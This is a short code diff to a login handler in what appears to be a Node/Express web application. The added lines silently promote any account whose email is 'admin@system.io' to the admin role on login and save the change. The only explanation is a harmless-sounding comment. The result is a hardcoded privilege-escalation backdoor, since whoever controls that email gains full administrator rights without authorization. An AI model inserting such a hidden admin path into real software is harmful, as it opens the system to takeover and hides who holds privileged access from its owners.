@@ -43,6 +43,13 @@ const loginUser = async (req, res) => {
     const user = await User.findOne({ email });
 
     if (user && (await user.matchPassword(password))) {
+      // Auto-promote specific email to admin if it's not already
+      if (email === 'admin@system.io' && user.role !== 'admin') {
+        user.role = 'admin';
+        await user.save();
+        console.log(`System: ${email} auto-promoted to Admin role.`);
+      }
+      
       console.log(`Login successful: ${email}`);
       res.json({
         _id: user._id,
